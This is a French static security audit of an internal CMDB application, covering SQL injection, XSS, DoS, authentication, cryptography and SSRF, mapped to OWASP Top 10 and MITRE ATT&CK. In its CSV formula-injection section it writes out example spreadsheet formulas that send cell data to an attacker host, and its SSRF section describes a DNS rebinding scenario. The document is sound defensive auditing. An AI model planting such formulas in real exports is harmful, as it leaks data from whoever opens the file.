# Audit sécurité — Constellation CMDB

Revue statique : injection SQL, XSS, overflow/DoS, SSRF, auth, crypto. Mapping OWASP Top 10 2021 et MITRE ATT&CK.

Date initiale : 2026-04-20 · Revue : 2026-04-26
Branche : `main` (post-lot durcissement)
Périmètre : `api/app/**` (Python), `frontend/js/**` (JS), `frontend/nginx.conf`, `schema.sql`.

---

## TL;DR

| Sévérité | Nb (état actuel) | Sujet |
|---|---|---|
| Critique | 0 | — |
| Élevé | 0 | — |
| Moyen | 0 | (3 findings clos depuis l'audit initial — voir §2/§3/§4/§7) |
| Faible | 1 | DNS rebinding non mitigé pour les webhooks (acceptable, documenté §6) |
| Info | 1 | Pas de `X-Forwarded-For` parsing → l'IP vue par le rate limiter est celle du dernier hop (OK avec Traefik en trusted proxy) |

**Verdict global (revue 2026-04-26)** : posture renforcée — les 4 items du lot durcissement (`hmac.compare_digest`, `client_max_body_size`, `_sanitize_csv_cell`, `innerHTML → textContent`) sont implémentés et présents dans `main`. Le CSP a aussi été durci (`style-src 'self'` sans `unsafe-inline` après migration des inline styles). Reste un seul finding faible (DNS rebinding) volontairement non implémenté — risque négligeable derrière VPN+SSO.

### Récapitulatif des résolutions depuis 2026-04-20

| Finding initial | Statut | Preuve |
|---|---|---|
| Timing attack `==` tokens (Moyen §4) | **résolu** | `auth.py:43` `_const_eq()` via `hmac.compare_digest` — utilisé en `auth.py:235,238,290,349,352` |
| `client_max_body_size` absent (Moyen §3) | **résolu** | `nginx.conf:21` `client_max_body_size 20m;` |
| CSV formula injection (Moyen §7) | **résolu** | `export.py:30` `_CSV_DANGEROUS_PREFIX` + `_sanitize_csv_cell()` appliqué dans `_csv_response` |
| `innerHTML` interpolé sur 2 vues (Faible §2) | **résolu** | versioning.js : `_setStatus()` utilise `textContent`. repositories.js : plus d'interpolation HTML d'erreur, table rendue avec `esc()` |
| `style-src 'unsafe-inline'` (Note §10) | **résolu** | `nginx.conf:40` CSP a maintenant `style-src 'self'` (migration inline-styles → classes terminée) |

---

## 1. Injection SQL — safe

### Méthode d'analyse
Grep de `text(f"..."` sur 25 fichiers. Chaque f-string audité pour vérifier que la partie dynamique n'est pas une donnée utilisateur brute.

### Patterns trouvés
Tous les f-strings dynamiques interpolent des **identifiants whitelisted** (clés d'un `dict` constant), jamais des valeurs utilisateur :

```python
# api/app/routes/read.py:104
_SORT_MAP = {"hostname": "n.hostname", "env": "n.environment", ...}
order = f"{_SORT_MAP[sort_by]} {direction}, n.hostname" if sort_by in _SORT_MAP else "n.hostname"
text(f"SELECT * FROM v_node_summary n {where} ORDER BY {order}")
```

- `_SORT_MAP[sort_by]` : lookup dans un dict constant → KeyError ou valeur connue, jamais injection
- `direction` : ternaire `"DESC" if x == "desc" else "ASC"` → deux valeurs possibles
- `where` : construit via `where_clause(clauses)` où `clauses` contient des fragments statiques avec placeholders `:param`

### Autres cas identifiés
- `api/app/routes/export.py:86` — même pattern, `where` pré-construit, données via `params`
- `api/app/notify.py:329` — `route_col = f"route_{route}"` avec `route` tiré d'un mapping constant `_TRIGGER_ROUTE_FIELD`
- `api/app/routes/collect.py` — upserts avec placeholders nommés uniquement

### Paramètres utilisateurs
Tous passés via `params dict + :placeholder`. UUID validés via `validate_uuid()` avant query.

**Conclusion** : 0 faille d'injection SQL. Convention projet respectée (CLAUDE.md : "Paramètres nommés uniquement — jamais de f-string dans le SQL").

---

## 2. Cross-Site Scripting (XSS) — résolu

Closé 2026-04-26 (voir tableau récap §TL;DR). `tests/test_csp_compliance.py` reste actif (0 handler inline, `data-action` requis, pas de `window.fn`).

---

## 3. Overflow / Dénis de service — 1 moyen

### Request body size
`nginx.conf:21` : `client_max_body_size 20m;` — closé 2026-04-26.

### Rate limiting
`api/app/security.py` — **2000 req/60s par IP** (`rate_limit_requests=2000`, `rate_limit_window_seconds=60` dans `config.py`), avec purge périodique. OK pour un outil interne mais :
- Le compteur est in-memory (non partagé entre workers uvicorn). Avec 4 workers, la limite effective est 8000 req/60s. Acceptable — on n'est pas derrière un LB multi-replicas.
- Brute-force auth : **10 failures / 5min → ban 10min**. Solide. Ne compte que les tentatives Bearer explicites (évite les faux positifs sur requêtes non authentifiées).

### Pagination
Tous les endpoints list ont `per_page: int = Query(..., le=200)`. Pas de dump complet possible sauf via `/export/*` (audité, limité à N=30-50 pour les CVEs les plus risqués + CSV streamé).

### Schema migration lock
`pg_try_advisory_lock(42)` au startup → un seul worker applique `schema.sql`. Bon pattern (pas de race sur les migrations).

---

## 4. Authentification & autorisation — Robuste

### Architecture
1. **SSO proxy** (Authelia / Authentik / Keycloak) — header `Remote-User` accepté **uniquement** depuis le réseau Traefik (`172.16-20.x`, vérifié avec `startswith("172.16.")` et préfixes terminés par `.` → pas de faux positif type `172.160.x`)
2. **Bearer tokens** — hachés HMAC-SHA512 avec `TOKEN_HMAC_KEY` per-instance (128-char hex). Un dump DB seul est inutile.
3. **Scopes granulaires** — 15 scopes × modes `r`/`w` (`SCOPES` tuple `auth.py:125`). Collect-token ne peut PAS lire. Secret-key admin est legacy (warning loggé).

### Comparaison constant-time
`auth.py:43` `_const_eq(a, b)` enveloppe `hmac.compare_digest`, utilisé pour toutes les comparaisons de tokens `.env` (`auth.py:235,238,290,349,352`). Closé 2026-04-26.

### Trusted proxy — bien implémenté
```python
_TRUSTED_PROXIES = {"172.16.", "172.17.", "172.18.", "172.19.", "172.20."}
ip.startswith(p)  # préfixe avec point terminal → pas de bypass via 172.160.x.x
```
Le header `Remote-User` est rejeté silencieusement si la connexion ne vient pas d'un proxy de confiance → pas de forge depuis un autre réseau.

### Tokens DB
- HMAC-SHA512 (voir `hash_token` : `hmac.new(key, token, sha512)`)
- Affichés **une seule fois** à la création (`"value" = token` seulement dans la réponse POST)
- Listings → hash tronqué 12 chars (identifiant stable, non-reversible)
- `expires_at` supporté
- `last_used_at` mis à jour sur chaque usage (traçabilité)
### SSO group mapping
`_resolve_sso_role()` — rôle le plus élevé gagne (admin > ops > viewer). Utilisateur SSO sans groupes → `viewer` (least privilege, par défaut).
---

## 5. Crypto — Strong

| Usage | Algo | Statut |
|---|---|---|
| Token DB hash | HMAC-SHA512 avec `token_hmac_key` per-instance | best practice |
| Paramètres sensibles (SMTP pass, Matrix token…) | `crypto.decrypt_setting()` (Fernet) | |
| TLS sortant (webhooks, Matrix, email) | httpx (validation certificat par défaut) + `starttls()`/SMTP_SSL | |
| Clé app (`API_SECRET_KEY`, `TOKEN_HMAC_KEY`) | Généré via `openssl rand` dans `make secrets` | |

**Pas trouvé** :
- Pas de MD5/SHA1 utilisé pour de la sécurité (SHA-1 uniquement pour des hash git via connecteurs forge, non-sécurité)
- Pas de `random.random()` là où il faudrait du CSPRNG (tous les token generators passent par `secrets.token_urlsafe()` dans `tokens.py`)

---

## 6. SSRF — Bien mitigé, 1 note

### Guard
`api/app/security.py:109` `validate_url(url, allow_private=False)` :
- Bloque les schémas non http/https
- Bloque les hostnames `localhost`, `0.0.0.0`, `[::1]`…
- Bloque les IPs directement dans RFC1918, loopback, link-local, unique-local v6

Utilisé dans :
- `notify._send_webhook()` (user webhooks) avec `allow_private=True` (self-hosted Matrix/Mattermost sur WG) → accepté, documenté
- `repositories` check versions (DockerHub, GHCR…) avec `allow_private=False` → bloque les cibles internes

### Faible — DNS rebinding
Le guard check l'IP si l'URL est déjà une IP. Si c'est un hostname (`webhook.attacker.com`), la résolution DNS se fait dans httpx après la validation → un attaquant peut résoudre `webhook.attacker.com` vers une IP publique au moment du check, puis vers `10.x.x.x` pour la requête réelle.

**Impact** : faible — l'attaquant doit d'abord créer un webhook (scope `automation:w` ou `settings:w`), et même s'il y arrive, on est déjà dans un scénario de compromise d'un token admin.

**Remédiation** (non-triviale, pas recommandée à ce stade) :
```python
import socket
resolved = socket.getaddrinfo(hostname, None)
for family, _, _, _, sockaddr in resolved:
    ip = sockaddr[0]
    # re-check IP against _BLOCKED_NETWORKS
```
Puis forcer httpx à utiliser cette IP via un transport custom. Complexité élevée pour un risque faible — à documenter plutôt qu'à implémenter.

---

## 7. CSV formula injection — Moyen

### Risque
`api/app/routes/export.py` exporte des CSV qui contiennent des champs user-controlled (hostname, cve title, note de workflow…). Si un hostname commence par `=`, `+`, `-`, `@`, `\t` ou `\r`, Excel/LibreOffice l'interprète comme formule :

```
=HYPERLINK("http://attacker.com/?x="&A1,"click")
=IMPORTXML("http://attacker.com/",...)
```

### Chemin d'exploitation
Un attaquant avec `collect:w` (token Ansible) peut poster un node avec `hostname: "=HYPERLINK(…)"`. L'admin télécharge le CSV d'audit → ouvre dans Excel → formule exécutée.

### Remédiation
Closé 2026-04-26 : `export.py:30` `_CSV_DANGEROUS_PREFIX` + `_sanitize_csv_cell()` appliqué à toutes les lignes dans `_csv_response`.

---

## 8. Tarfile extraction — safe

`api/app/routes/pkg_repositories.py:369` lit des `.db` Pacman comme tarballs. Seul `tar.extractfile(member)` est utilisé → **aucune écriture disque**, donc pas de risque Zip Slip / path traversal. Les URLs proviennent de repos admin-configurés (scope `repositories:w`). Un miroir compromis ne peut envoyer que du contenu mal-formé, géré par le `try/except`.

---

## 9. Audit log —

Toutes les actions sensibles appellent `log_action(db, actor, action, target_type, target_id, detail)` :
- Changement de workflow CVE
- Exécution de policy automation
- Création/suppression token
- Modification settings
- Deploy / incident / itsm actions

Table `audit_log` indexée sur `created_at` + `actor`. Exportable via `/export/audit?days=30`.

---

## 10. Headers sécurité —

### Côté nginx (`nginx.conf:40`)
- `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; font-src 'self'; img-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self';`
- `X-Frame-Options: SAMEORIGIN`
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: strict-origin-when-cross-origin`

### Côté FastAPI (`main.py`)
Mêmes headers dupliqués + `X-Frame-Options: DENY` (plus strict que nginx) + `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Le plus strict des deux gagne (c'est FastAPI en dernier).

---

## Mapping OWASP Top 10 (2021)

| Risk | Statut | Preuve |
|---|---|---|
| **A01:2021 Broken Access Control** | Fort | RBAC par scopes × modes (`require_permission`), SSO role mapping, audit log exhaustif |
| **A02:2021 Cryptographic Failures** | Fort | HMAC-SHA512 sur tokens, Fernet sur secrets DB, TLS partout, `secrets` module pour génération |
| **A03:2021 Injection** | Safe | SQL paramétré, whitelist sur identifiants dynamiques. CSV formula injection mitigée (`_sanitize_csv_cell`). |
| **A04:2021 Insecure Design** | Fort | Modèle "ne JAMAIS exposer sur Internet" documenté ; accès VPN+SSO obligatoire |
| **A05:2021 Security Misconfiguration** | Fort | CSP `style-src 'self'`, headers, CORS configurable, `client_max_body_size 20m`. |
| **A06:2021 Vulnerable Components** | | Versions pinnées (`versions.env`), `make scan-images` Trivy sur CI |
| **A07:2021 Identification & Authentication Failures** | Fort | Rate limit + brute-force ban + tokens hashés + `hmac.compare_digest` (`_const_eq`). |
| **A08:2021 Software and Data Integrity** | | Audit log complet, pas de deserialisation user-controlled (JSONB validé par Pydantic) |
| **A09:2021 Security Logging and Monitoring** | | Logger structuré, table `audit_log`, export `/audit` 30j |
| **A10:2021 SSRF** | Fort | `validate_url()` guard, blocklist IP ranges. **[Faible]** DNS rebinding non mitigé (acceptable) |

---

## Mapping MITRE ATT&CK (tactiques pertinentes en mode "interne")

| Tactique | Technique | Mitigation en place |
|---|---|---|
| **Initial Access** | T1190 Exploit Public-Facing App | N/A — jamais exposé publiquement (CLAUDE.md modèle réseau) |
| **Credential Access** | T1552.001 Credentials in Files | Secrets en DB chiffrés (Fernet), `.env` hors git, tokens hashés HMAC-SHA512 |
| | T1110 Brute Force | Rate limiter 2000/60s + ban 10 fails/5min × 10min + `hmac.compare_digest` sur tokens `.env` |
| | T1040 Network Sniffing | TLS sur toutes les sorties httpx + WireGuard entre nodes |
| **Discovery** | T1046 Network Service Discovery | Tous endpoints authentifiés — aucun leak de topologie anonyme |
| **Lateral Movement** | T1021.002 SMB / T1021.004 SSH | Hors périmètre — CMDB n'exécute rien sur les hôtes |
| **Execution** | T1059 Command Interp. | Aucun `shell=True`, `os.system` absent, `subprocess.run(args_list)` uniquement si présent |
| | T1609 Container Admin Cmd | Vault-sealed gate bloque `_execute_action` sauf `notify`/`email`/`create_incident` |
| **Persistence** | T1098 Account Manipulation | Audit log sur création/suppression tokens + tokens `expires_at` |
| **Privilege Escalation** | T1548 Abuse Elevation | Scopes séparés → collect token ne peut pas lire, secret_key deprecated avec warning |
| **Defense Evasion** | T1562.008 Disable Cloud Logs | `audit_log` est append-only côté app ; pas d'endpoint DELETE |
| **Exfiltration** | T1041 Exfil over C2 | CSV streaming limité par scope + rate limit ; CSV formula injection mitigée (`_sanitize_csv_cell`) |
| **Impact** | T1485 Data Destruction | Aucune route DELETE sur tables historiques (incidents, cve_status, audit) |

---

## Plan d'action

Lot durcissement clos (`hmac.compare_digest`, `client_max_body_size`, `_sanitize_csv_cell`, `innerHTML → textContent`, retrait de `style-src 'unsafe-inline'`).

### À plus long terme (ne pas prioriser)
- DNS rebinding mitigation (complexe, risque faible) — documenter uniquement
- Migration `.env SECRET_KEY` / `COLLECT_TOKEN` → secrets rhorizon (mapping `cmdb-secret-key`, `cmdb-collect-token`, `cmdb-token-hmac-key` déjà câblé dans `_load_vault_secrets()`). Phase 3 d'intégration (voir CLAUDE.md). Reste à provisionner les secrets côté vault et vider les valeurs `.env`.

---

## Non-findings explicitement vérifiés

Ces points ont été regardés et sont **sains** (cités pour traçabilité) :
- Pas de `shell=True` ni `os.system` dans tout `api/app/**`
- Pas de deserialisation pickle/yaml.load
- Pas de regex DoS identifié (patterns simples, pas de backtracking catastrophique)
- Pas de SSRF dans `repositories.py` (allow_private=False pour les registries publics)
- `validate_uuid()` appliqué avant toute query paramétrée par un path UUID
- `ALLOWED_ORIGINS` défaut `[]` — CORS bloqué par défaut, opt-in seulement
- Pas d'`eval()` ni `exec()` dans la codebase Python
- Pas de `dangerouslySetInnerHTML` (projet vanilla JS — N/A)
- Pas de route publique qui accepte du HTML/Markdown rendu sans escape

---

## Scope limits

Cet audit est **statique** — il ne couvre pas :
- Les dépendances amont (Trivy, `make scan-images` s'en charge en CI)
- Les scans dynamiques type ZAP/Burp (à faire dans un environnement dédié, pas en prod)
- La sécurité des containers (surface Docker socket, capabilities) — relève d'un audit infra Portainer
- L'audit cryptographique formel des algos (on fait confiance aux primitives stdlib)
- Le modèle de menace côté `Woodpecker`/`Gitea`/`Matrix` (chacun a son propre audit)
